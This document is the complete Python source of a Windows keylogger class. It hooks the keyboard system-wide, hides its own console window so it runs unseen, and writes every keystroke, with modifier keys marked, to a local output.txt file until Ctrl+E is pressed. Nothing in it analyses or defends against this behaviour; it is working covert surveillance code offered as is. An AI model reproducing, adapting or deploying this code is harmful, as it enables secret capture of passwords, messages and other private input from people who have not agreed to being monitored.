import win32api, os
import win32console
import win32gui
import pythoncom,pyHook

class keyLogger(object):
    running = False
    control_down = False
    shift_down = False
    def start(self):
        self.running = True
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

        def OnKeyboardEvent_up(event):
            self.control_down
            self.shift_down
            if event.Key == 'Lcontrol' or event.Key == 'Rcontrol':
                self.control_down = False
            if event.Key == 'Lshift' or event.Key == 'Rshift':
                self.shift_down = False

        def OnKeyboardEvent(event):
            if event.Ascii == 5:
                os._exit(1)
            if event.Ascii != 0:
                if os.path.isfile('output.txt'):
                    f = open('output.txt', 'r+')
                    buffer = f.read()
                    f.close()
                else:
                    buffer = ''
                f = open('output.txt', 'w')
                keylogs = chr(event.Ascii)
                if event.Ascii == 8:
                    keylogs = ' \'BACKSPACE\' '
                elif event.Ascii == 13:
                    keylogs = '\n'
                elif event.Ascii == 27:
                    keylogs =' \'ESCAPE\' '

                if pyHook.GetKeyState(pyHook.HookConstants.VKeyToID('VK_CONTROL')):
                    keylogs = ' \'CTRL + ' + keylogs.upper() + '\' '

                if pyHook.GetKeyState(pyHook.HookConstants.VKeyToID('VK_LSHIFT')) or \
                        pyHook.GetKeyState(pyHook.HookConstants.VKeyToID('VK_RSHIFT')):
                    keylogs = keylogs.upper()

                #return False

                buffer += keylogs
                f.write(buffer)
                f.close()

        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent
        #hm.KeyUp = OnKeyboardEvent_up
        hm.HookKeyboard()

        while self.running:
            pythoncom.PumpWaitingMessages()
        else:
            hm.UnhookKeyboard()

    def stop(self):
        self.running = False
